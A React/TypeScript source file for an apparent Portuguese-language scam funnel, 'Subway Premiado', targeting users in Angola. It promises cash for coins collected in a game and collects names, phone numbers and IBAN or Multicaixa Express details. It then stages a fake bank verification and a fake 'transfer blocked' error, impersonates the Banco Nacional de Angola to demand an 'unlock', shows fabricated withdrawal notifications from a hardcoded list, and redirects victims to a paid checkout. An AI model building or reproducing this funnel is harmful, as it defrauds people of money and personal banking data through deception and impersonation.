import { createFileRoute } from "@tanstack/react-router";
import { createElement, useCallback, useEffect, useRef, useState } from "react";

const PIXEL_ID = "1618326293178975";
const CHECKOUT_URL = "https://mentora.ao/produto/e5a43d1a-97a8-4318-8543-45814073ab5f";
const VSL_PLAYER =
  "https://scripts.converteai.net/311de72d-501e-4f43-b5d4-4504aab55d7d/players/6aa333783c93a6112423f904/v4/player.js";
const VSL_ID = "vid-6aa333783c93a6112423f904";
const VSL_CTA_TARGET_SECONDS = 8 * 60 + 34;
const GAME_URL = "/game/index.html";
const META_COINS = 110;

const pixelInline = `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','${PIXEL_ID}');fbq('track','PageView');`;

export const Route = createFileRoute("/")({
  component: Funil,
  head: () => ({
    meta: [
      { title: "Subway Premiado — Ganhe Kwanzas a cada moeda" },
      {
        name: "description",
        content:
          "Colete moedas no Subway Premiado: cada moeda vale 1.000 Kz. Chegue a 110.000 Kz e levante por Multicaixa Express ou IBAN.",
      },
      { property: "og:title", content: "Subway Premiado — Ganhe Kwanzas a cada moeda" },
      {
        property: "og:description",
        content: "Corra, apanhe moedas e converta em Kwanzas. Saque a partir de 110.000 Kz.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Lilita+One&family=Inter:wght@400;500;600;700;800;900&display=swap",
      },
      { rel: "stylesheet", href: "/funil/funil.css" },
      { rel: "preload", as: "image", href: "/funil/bg.jpg", fetchpriority: "high" },
      { rel: "prefetch", href: GAME_URL, as: "document" },
      { rel: "dns-prefetch", href: "https://cdn.converteai.net" },
      { rel: "dns-prefetch", href: "https://scripts.converteai.net" },
      { rel: "dns-prefetch", href: "https://images.converteai.net" },
      { rel: "dns-prefetch", href: "https://license.vturb.com" },
      { rel: "dns-prefetch", href: "https://connect.facebook.net" },
    ],
    scripts: [{ children: pixelInline }],
  }),
});

type Step =
  | "offer"
  | "register"
  | "linked"
  | "game"
  | "bonus"
  | "withdraw"
  | "express"
  | "iban"
  | "error"
  | "security"
  | "almost";

type State = {
  step: Step;
  name: string;
  phone: string;
  method: "express" | "iban" | null;
  bank: string;
  ibanName: string;
  iban: string;
  expressNumber: string;
  amount: number;
};

const initialState: State = {
  step: "offer",
  name: "",
  phone: "",
  method: null,
  bank: "",
  ibanName: "",
  iban: "",
  expressNumber: "",
  amount: 115000,
};

const BANKS = [
  "BAI",
  "BFA",
  "BIC",
  "Atlântico",
  "BMA",
  "BNI",
  "SOL",
  "Caixa Angola",
  "Standard Bank",
  "Outro",
];

const TOASTS = [
  { nome: "Carlos M.", valor: "85.000 Kz" },
  { nome: "Ana Silva", valor: "112.000 Kz" },
  { nome: "João Pedro", valor: "94.500 Kz" },
  { nome: "Mariana L.", valor: "108.000 Kz" },
  { nome: "Rui Santos", valor: "76.000 Kz" },
  { nome: "Beatriz F.", valor: "121.000 Kz" },
  { nome: "Pedro A.", valor: "88.500 Kz" },
  { nome: "Sofia C.", valor: "99.000 Kz" },
];

const fmt = (n: number) => n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
const fmtKz = (n: number) => fmt(n) + " Kz";
const formatPhone = (v: string) => {
  const d = v.replace(/\D/g, "");
  if (d.length <= 3) return d;
  if (d.length <= 6) return d.slice(0, 3) + " " + d.slice(3);
  return d.slice(0, 3) + " " + d.slice(3, 6) + " " + d.slice(6, 9);
};
const validPhone = (v: string) => v.replace(/\D/g, "").length >= 9;

function track(event: string, data?: Record<string, unknown>) {
  try {
    (window as unknown as { fbq?: (...a: unknown[]) => void }).fbq?.("track", event, data);
  } catch {
    /* noop */
  }
}

function Funil() {
  const [state, setState] = useState<State>(initialState);
  const [hydrated, setHydrated] = useState(false);
  const [gameMounted, setGameMounted] = useState(false);
  const [checking, setChecking] = useState(false);
  const [checkProgress, setCheckProgress] = useState(0);
  const [bankOpen, setBankOpen] = useState(false);
  const [toast, setToast] = useState<{ nome: string; valor: string } | null>(null);
  const [toastShown, setToastShown] = useState(false);
  const [ctaReady, setCtaReady] = useState(false);

  const step = state.step;
  const patch = useCallback((p: Partial<State>) => setState((s) => ({ ...s, ...p })), []);

  /* restore */
  useEffect(() => {
    try {
      const raw = localStorage.getItem("subway_funil_state");
      if (raw) setState((s) => ({ ...s, ...JSON.parse(raw) }));
    } catch {
      /* noop */
    }
    setHydrated(true);
    track("ViewContent", { content_name: "Subway Premiado - Funil", content_category: "Oferta" });
  }, []);

  /* persist */
  useEffect(() => {
    if (!hydrated) return;
    try {
      localStorage.setItem("subway_funil_state", JSON.stringify(state));
    } catch {
      /* noop */
    }
  }, [state, hydrated]);

  /* fullscreen game mode + scroll top on step change */
  useEffect(() => {
    if (!hydrated) return;
    document.body.classList.toggle("game-mode", step === "game");
    if (step === "game") setGameMounted(true);
    window.scrollTo({ top: 0, behavior: "smooth" });
    return () => document.body.classList.remove("game-mode");
  }, [step, hydrated]);

  /* poll game progress */
  useEffect(() => {
    if (step !== "game") return;
    const id = setInterval(() => {
      try {
        const w = parseInt(localStorage.getItem("subway_withdrawal_amount") || "0", 10);
        const coins = parseInt(localStorage.getItem("subway_total_coins") || "0", 10);
        if (w > 0) return patch({ amount: w, step: "bonus" });
        if (coins >= META_COINS) {
          const amount = coins * 1000;
          localStorage.setItem("subway_withdrawal_amount", String(amount));
          patch({ amount, step: "bonus" });
        }
      } catch {
        /* noop */
      }
    }, 1500);
    return () => clearInterval(id);
  }, [step, patch]);

  /* social proof toasts on the final step */
  useEffect(() => {
    if (step !== "almost" || toastShown) return;
    setToastShown(true);
    let i = 0;
    const show = () => {
      setToast(TOASTS[i % TOASTS.length]);
      i++;
      setTimeout(() => setToast(null), 3500);
    };
    show();
    const id = setInterval(show, 5000);
    return () => clearInterval(id);
  }, [step, toastShown]);

  const goCheck = (next: Step, duration = 2500) => {
    setChecking(true);
    setCheckProgress(0);
    requestAnimationFrame(() => setCheckProgress(100));
    setTimeout(() => {
      setChecking(false);
      setCheckProgress(0);
      patch({ step: next });
    }, duration);
  };

  const destino =
    (state.method === "express" ? state.expressNumber : state.iban) || "-";

  const stepCls = (id: Step) => "step" + (step === id ? " active" : "");

  return (
    <div className="funil">
      {/* STEP 1 */}
      <div className={stepCls("offer")} id="step-offer">
        <div className="card">
          <div className="badge badge-red">🔥 OFERTA ATIVA!</div>
          <div className="icon-center icon-skate">🛹</div>
          <h1 className="title">
            GANHE DINHEIRO
            <br />
            NO SUBWAY SURFERS
          </h1>
          <p className="subtitle subtitle-orange">
            SUA CONTA FOI SELECIONADA PARA
            <br />
            FATURAR COM CADA MOEDA COLETADA
          </p>
          <div className="info-box">
            <div className="info-box-title">🛹 Bónus de Saque Imediato</div>
            <ul className="benefit-list">
              <li>
                <span className="emoji">💰</span>Comece com moedas que valem dinheiro real.
              </li>
              <li>
                <span className="emoji">⚡</span>Multiplicadores aumentam seus ganhos por corrida.
              </li>
              <li>
                <span className="emoji">🪙</span>Colete moedas e troque por Kwanzas instantâneo.
              </li>
            </ul>
          </div>
          <button className="btn btn-green btn-pulse" onClick={() => patch({ step: "register" })}>
            COMEÇAR A FATURAR
          </button>
          <p className="footer-text">Oferta limitada • Apenas para novos surfistas</p>
        </div>
      </div>

      {/* STEP 2 */}
      <div className={stepCls("register")} id="step-register">
        <div className="card">
          <div className="badge badge-green">VINCULAR CONTA</div>
          <div className="icon-center icon-clipboard">📋</div>
          <h1 className="title">
            CADASTRE-SE E<br />
            COMECE A GANHAR!
          </h1>
          <p className="subtitle">
            VINCULE SUA CONTA PARA RECEBER
            <br />
            SEUS GANHOS
          </p>
          <div className="input-group">
            <label className="input-label" htmlFor="input-name">
              NOME COMPLETO
            </label>
            <input
              id="input-name"
              type="text"
              className="input-field"
              placeholder="Seu nome"
              autoComplete="name"
              value={state.name}
              onChange={(e) => patch({ name: e.target.value })}
            />
          </div>
          <div className="input-group">
            <label className="input-label" htmlFor="input-phone">
              NÚMERO DE TELEFONE
            </label>
            <input
              id="input-phone"
              type="tel"
              className="input-field"
              placeholder="9XX XXX XXX"
              autoComplete="tel"
              inputMode="tel"
              value={state.phone}
              onChange={(e) => patch({ phone: formatPhone(e.target.value) })}
            />
          </div>
          <button
            className="btn btn-orange"
            onClick={() => {
              if (!state.name.trim()) return alert("Por favor, insira seu nome completo.");
              if (!validPhone(state.phone)) return alert("Insira um número válido (9XX XXX XXX).");
              patch({ step: "linked" });
              track("Lead", {
                content_name: "Cadastro Completo",
                content_category: "Subway Premiado",
              });
            }}
          >
            🎮 CADASTRAR E JOGAR
          </button>
          <p className="footer-text">🔒 Seus dados estão protegidos por criptografia</p>
        </div>
      </div>

      {/* STEP 3 */}
      <div className={stepCls("linked")} id="step-linked">
        <div className="card">
          <div className="badge badge-green">VINCULAR CONTA</div>
          <div className="icon-center icon-coinbag">💰</div>
          <h1 className="title">CONTA VINCULADA!</h1>
          <p className="subtitle">SUA CARTEIRA DE GANHOS ESTÁ ATIVA!</p>
          <p
            style={{
              fontFamily: "'Inter',sans-serif",
              fontWeight: 700,
              fontSize: 13,
              color: "#1a1008",
              textAlign: "center",
              margin: "12px 0",
            }}
          >
            Moedas coletadas agora serão convertidas em saldo real!
          </p>
          <div className="info-box">
            <div className="info-box-title">✅ Sistema de Ganhos Ativado!</div>
            <p className="info-box-text">
              Cada moeda coletada = <span className="hl-green">1.000 Kz</span> na sua carteira
            </p>
          </div>
          <button className="btn btn-green" onClick={() => patch({ step: "game" })}>
            🎮 JOGAR AGORA
          </button>
          <p className="footer-text">
            Saldo mínimo para saque: <span className="orange">110.000 Kz</span>
          </p>
        </div>
      </div>

      {/* STEP 4 — jogo */}
      <div className={stepCls("game")} id="step-game">
        {gameMounted && (
          <iframe className="game-frame" src={GAME_URL} title="Subway Premiado" allowFullScreen />
        )}
      </div>

      {/* STEP 5 */}
      <div className={stepCls("bonus")} id="step-bonus">
        <div className="card">
          <div className="badge badge-red">🎉 PARABÉNS!</div>
          <div className="icon-center icon-trophy">🏆</div>
          <h1 className="title">BÓNUS CONCLUÍDO!</h1>
          <p className="subtitle">AS SUAS JOGADAS GRÁTIS TERMINARAM</p>
          <div className="score-display">
            <div className="score-label">TOTAL GANHO</div>
            <div className="score-value">{fmtKz(state.amount)}</div>
          </div>
          <p
            style={{
              fontFamily: "'Inter',sans-serif",
              fontWeight: 700,
              fontSize: 13,
              color: "#1a1008",
              textAlign: "center",
              margin: "10px 0",
            }}
          >
            disponível para levantamento.
          </p>
          <button className="btn btn-green" onClick={() => patch({ step: "withdraw" })}>
            💰 LEVANTAR AGORA
          </button>
        </div>
      </div>

      {/* STEP 6 */}
      <div className={stepCls("withdraw")} id="step-withdraw">
        <div className="card">
          <div className="badge badge-orange">LEVANTAMENTO</div>
          <div className="icon-center icon-bank">🏦</div>
          <h1 className="title">
            COMO DESEJA
            <br />
            RECEBER?
          </h1>
          <p className="subtitle">ESCOLHA O SEU MÉTODO DE SAQUE</p>
          <div className="withdraw-options">
            <div
              className="withdraw-option"
              onClick={() => patch({ method: "express", step: "express" })}
            >
              <div className="withdraw-option-img">
                <img src="/funil/express.png" alt="Multicaixa Express" loading="lazy" />
              </div>
              <div className="withdraw-option-content">
                <div className="withdraw-option-title">Multicaixa Express</div>
                <div className="withdraw-option-sub">Receba no seu telemóvel</div>
              </div>
              <div className="withdraw-option-arrow">›</div>
            </div>
            <div
              className="withdraw-option"
              onClick={() => patch({ method: "iban", step: "iban" })}
            >
              <div className="withdraw-option-img">
                <img src="/funil/iban.png" alt="Transferência IBAN" loading="lazy" />
              </div>
              <div className="withdraw-option-content">
                <div className="withdraw-option-title">Transferência IBAN</div>
                <div className="withdraw-option-sub">Qualquer banco de Angola</div>
              </div>
              <div className="withdraw-option-arrow">›</div>
            </div>
          </div>
        </div>
      </div>

      {/* STEP 6A */}
      <div className={stepCls("express")} id="step-express">
        <div className="card">
          <div className="badge badge-green">VALIDAÇÃO</div>
          <h1 className="title">
            MULTICAIXA
            <br />
            EXPRESS
          </h1>
          <p className="subtitle">
            INSIRA AS INFORMAÇÕES
            <br />
            CORRETAMENTE
          </p>
          <div className="input-group">
            <label className="input-label" htmlFor="input-express">
              NÚMERO EXPRESS
            </label>
            <input
              id="input-express"
              type="tel"
              className="input-field"
              placeholder="9XX XXX XXX"
              autoComplete="tel"
              inputMode="tel"
              value={state.expressNumber}
              onChange={(e) => patch({ expressNumber: formatPhone(e.target.value) })}
            />
          </div>
          <button
            className="btn btn-green"
            onClick={() => {
              if (!validPhone(state.expressNumber)) return alert("Número Express inválido.");
              patch({ expressNumber: state.expressNumber.replace(/\s/g, "") });
              goCheck("error");
            }}
          >
            CONFIRMAR SAQUE
          </button>
          <a className="back-link" onClick={() => patch({ step: "withdraw" })}>
            ← Voltar
          </a>
        </div>
      </div>

      {/* STEP 6B */}
      <div className={stepCls("iban")} id="step-iban">
        <div className="card">
          <div className="badge badge-green">VALIDAÇÃO</div>
          <h1 className="title">REGISTRAR IBAN</h1>
          <p className="subtitle">
            INSIRA AS INFORMAÇÕES
            <br />
            CORRETAMENTE
          </p>
          <div className="input-group">
            <label className="input-label" htmlFor="input-iban-name">
              NOME DO TITULAR DA CONTA
            </label>
            <input
              id="input-iban-name"
              type="text"
              className="input-field"
              placeholder="Nome completo do titular"
              autoComplete="name"
              value={state.ibanName}
              onChange={(e) => patch({ ibanName: e.target.value })}
            />
          </div>
          <div className="input-group">
            <label className="input-label">NOME DO BANCO</label>
            <button
              className="input-field"
              onClick={() => setBankOpen(true)}
              style={{
                textAlign: "left",
                color: state.bank ? "#1a1008" : "#7a5636",
                position: "relative",
                paddingRight: 40,
                background: "#fcf1d9",
                cursor: "pointer",
              }}
            >
              <span>{state.bank || "Selecione o banco"}</span>
              <span
                style={{
                  position: "absolute",
                  right: 12,
                  top: "50%",
                  transform: "translateY(-50%)",
                  fontSize: 16,
                }}
              >
                ⌄
              </span>
            </button>
          </div>
          <div className="input-group">
            <label className="input-label" htmlFor="input-iban">
              IBAN (21 DÍGITOS)
            </label>
            <div style={{ display: "flex", gap: 8 }}>
              <div
                className="input-field"
                style={{
                  flex: "0 0 82px",
                  textAlign: "center",
                  fontWeight: 900,
                  color: "#7a5636",
                  background: "#f4e6c4",
                }}
              >
                AO06
              </div>
              <input
                id="input-iban"
                type="text"
                className="input-field"
                placeholder="000000000000000000"
                maxLength={18}
                inputMode="numeric"
                style={{ flex: 1 }}
                value={state.iban.replace(/^AO06/, "")}
                onChange={(e) => patch({ iban: e.target.value.replace(/\D/g, "").slice(0, 18) })}
              />
            </div>
          </div>
          <button
            className="btn btn-green"
            onClick={() => {
              const digits = state.iban.replace(/^AO06/, "");
              if (!state.ibanName.trim()) return alert("Insira o nome do titular.");
              if (!state.bank) return alert("Selecione um banco.");
              if (digits.length < 18) return alert("IBAN deve ter 21 dígitos (AO06 + 18).");
              patch({ iban: "AO06" + digits });
              goCheck("error");
            }}
          >
            CONFIRMAR SAQUE
          </button>
          <a className="back-link" onClick={() => patch({ step: "withdraw" })}>
            ← Voltar
          </a>
        </div>
      </div>

      {/* STEP 7 */}
      <div className={stepCls("error")} id="step-error">
        <div className="card">
          <div className="badge badge-red">⚠️ ERRO</div>
          <div className="icon-alert">⚠️</div>
          <h1 className="title">
            FALHA NA
            <br />
            TRANSFERÊNCIA
          </h1>
          <p className="subtitle">Código de erro: #TRF-4092</p>
          <div className="error-box">
            <div className="error-box-title">Erro detectado:</div>
            <div className="error-box-text">
              A transferência de {fmtKz(state.amount)} para {destino} foi bloqueada pelo sistema de
              segurança bancária.
            </div>
          </div>
          <div className="info-table">
            <div className="info-row">
              <div className="info-row-label">Status</div>
              <div className="info-row-value red">BLOQUEADO</div>
            </div>
            <div className="info-row">
              <div className="info-row-label">Método</div>
              <div className="info-row-value">
                {state.method === "express" ? "EXPRESS" : "IBAN"}
              </div>
            </div>
            <div className="info-row">
              <div className="info-row-label">Destino</div>
              <div className="info-row-value">{destino}</div>
            </div>
            <div className="info-row">
              <div className="info-row-label">Valor Retido</div>
              <div className="info-row-value red">{fmtKz(state.amount)}</div>
            </div>
          </div>
          <div className="info-box">
            <div className="info-box-text">
              💡 <strong>Bloqueio de segurança do BNA.</strong>
              <br />
              Resolva na próxima etapa.
            </div>
          </div>
          <button className="btn btn-red" onClick={() => patch({ step: "security" })}>
            RESOLVER BLOQUEIO
          </button>
        </div>
      </div>

      {/* STEP 8 */}
      <div className={stepCls("security")} id="step-security">
        <div className="card">
          <div className="badge badge-orange">🔒 SEGURANÇA</div>
          <div className="icon-bna-img">
            <img src="/funil/bna.jpg" alt="Banco Nacional de Angola" loading="lazy" />
          </div>
          <h1 className="title" style={{ color: "#fb7d12" }}>
            PROTOCOLO DE
            <br />
            SEGURANÇA
          </h1>
          <p className="subtitle">Subway Surfers Pay &amp; BNA</p>
          <div className="info-box">
            <div className="info-box-text">
              <strong style={{ color: "#fb7d12" }}>Ação Necessária:</strong> Para saques acima de
              100.000 Kz, ative a chave de segurança para liberar a transferência.
            </div>
          </div>
          <div className="info-table">
            <div className="info-row">
              <div className="info-row-label">Método</div>
              <div className="info-row-value">
                {state.method === "express" ? "Express" : "IBAN"}
              </div>
            </div>
            <div className="info-row">
              <div className="info-row-label">Destino</div>
              <div className="info-row-value">{destino}</div>
            </div>
            <div className="info-row">
              <div className="info-row-label">Valor Bloqueado</div>
              <div className="info-row-value red">{fmtKz(state.amount)}</div>
            </div>
          </div>
          <button className="btn btn-green" onClick={() => patch({ step: "almost" })}>
            🔒 RESOLVER E LIBERAR AGORA
          </button>
        </div>
      </div>

      {/* STEP 9 */}
      <div className={stepCls("almost")} id="step-almost">
        <div className="card">
          <div className="badge badge-red">⚡ QUASE LÁ</div>
          <h1 className="title" style={{ fontSize: 24 }}>
            DESBLOQUEIO
            <br />
            DE SALDO
          </h1>
          <p className="subtitle">
            Assista o vídeo informativo até o final para processar seu saque com segurança imediata
          </p>
          {step === "almost" && <Vsl onReady={() => setCtaReady(true)} />}
          {!ctaReady ? (
            <p className="warning-text">
              <span className="warning-dot" /> Assista o vídeo até o final para liberar o seu saque
            </p>
          ) : (
            <button
              className="btn btn-green btn-pulse"
              onClick={() => {
                track("InitiateCheckout", {
                  value: state.amount,
                  currency: "AOA",
                  content_name: "Subway Premiado Checkout",
                });
                window.location.href = CHECKOUT_URL;
              }}
            >
              💰 LIBERAR {fmtKz(state.amount)} AGORA
            </button>
          )}
        </div>
      </div>

      {/* MODAL VERIFICANDO */}
      <div className={"verificando-overlay" + (checking ? " active" : "")}>
        <div className="verificando-card">
          <div className="verificando-spinner" />
          <div className="verificando-title">VERIFICANDO...</div>
          <div className="verificando-subtitle">VALIDANDO SEUS DADOS COM O BANCO</div>
          <div className="verificando-progress-track">
            <div
              className="verificando-progress-fill"
              style={{
                width: checkProgress + "%",
                transition: checking ? "width 2.2s ease-in-out" : "none",
              }}
            />
          </div>
        </div>
      </div>

      {/* TOAST */}
      <div className={"toast-saque" + (toast ? " show" : "")}>
        <div className="toast-icon">✅</div>
        <div className="toast-body">
          <span className="toast-nome">{toast?.nome}</span> acabou de sacar{" "}
          <span className="toast-valor">{toast?.valor}</span>
        </div>
      </div>

      {/* BANCOS */}
      <div
        className={"overlay" + (bankOpen ? " active" : "")}
        onClick={() => setBankOpen(false)}
      />
      <div className={"bank-list" + (bankOpen ? " active" : "")}>
        <div className="bank-list-header">
          <span>Selecione o banco</span>
          <button className="bank-list-close" onClick={() => setBankOpen(false)}>
            ✕
          </button>
        </div>
        {BANKS.map((b) => (
          <div
            key={b}
            className={"bank-item" + (state.bank === b ? " selected" : "")}
            onClick={() => {
              patch({ bank: b });
              setBankOpen(false);
            }}
          >
            <div className="bank-item-name">{b}</div>
            <div className="bank-item-radio" />
          </div>
        ))}
      </div>
    </div>
  );
}

/* Player VSL: carrega só quando entra em ecrã e liberta o CTA no fim do vídeo */
function Vsl({ onReady }: { onReady: () => void }) {
  const areaRef = useRef<HTMLDivElement>(null);
  const [load, setLoad] = useState(false);

  useEffect(() => {
    const el = areaRef.current;
    if (!el) return;
    if (!("IntersectionObserver" in window)) return setLoad(true);
    const io = new IntersectionObserver(
      (entries) => {
        if (entries.some((e) => e.isIntersecting)) {
          setLoad(true);
          io.disconnect();
        }
      },
      { threshold: 0.5 },
    );
    io.observe(el);
    return () => io.disconnect();
  }, []);

  useEffect(() => {
    if (!load) return;
    if (!document.querySelector(`script[src="${VSL_PLAYER}"]`)) {
      const s = document.createElement("script");
      s.src = VSL_PLAYER;
      s.async = true;
      document.head.appendChild(s);
    }
    let done = false;
    const reveal = () => {
      if (done) return;
      done = true;
      onReady();
    };
    const poll = setInterval(() => {
      const player = document.getElementById(VSL_ID) as
        | (HTMLElement & { currentTime?: number })
        | null;
      if (!player) return;
      const video =
        (player.shadowRoot?.querySelector("video") as HTMLVideoElement | null) ??
        player.querySelector("video");
      const t = typeof video?.currentTime === "number" ? video.currentTime : player.currentTime;
      if (video?.ended) reveal();
      if (typeof t === "number" && t >= VSL_CTA_TARGET_SECONDS) reveal();
      if (done) clearInterval(poll);
    }, 500);
    return () => clearInterval(poll);
  }, [load, onReady]);

  return (
    <div className="vsl-area" ref={areaRef}>
      {load &&
        createElement(
          "vturb-smartplayer",
          {
            id: VSL_ID,
            style: { display: "block", margin: "0 auto", width: "100%", maxWidth: "400px" },
          },
          createElement("div", {
            className: "vturb-player-placeholder",
            style: {
              position: "relative",
              width: "100%",
              padding: "177.82426778242677% 0 0",
              zIndex: 0,
              backgroundColor: "black",
            },
          }),
        )}
    </div>
  );
}
